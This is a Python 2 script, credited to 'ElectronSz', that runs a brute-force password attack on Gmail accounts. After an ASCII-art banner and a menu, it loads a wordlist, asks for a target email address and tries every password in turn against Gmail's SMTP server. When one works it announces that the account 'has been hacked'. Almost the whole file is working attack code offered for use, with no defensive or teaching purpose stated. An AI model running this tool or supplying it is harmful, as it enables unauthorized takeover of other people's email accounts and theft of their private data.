# #!/usr/bin/python
# '''coded by ElectronSz'''

import smtplib
from os import system

def main():
   print '================================================='
   print '              Script by ElectronSz               '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()                '

main()
print '[1] Start the brute force attack'
print '[2] Exit'
option = input('==>')
if option == 1:
   file_path = raw_input('Enter the path of wordlist file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()

#login function to initiate forced login
def login():
    i = 0
    user_name = raw_input('Enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This account has been hacked, password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] This account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] Password not found => ' + password
login()
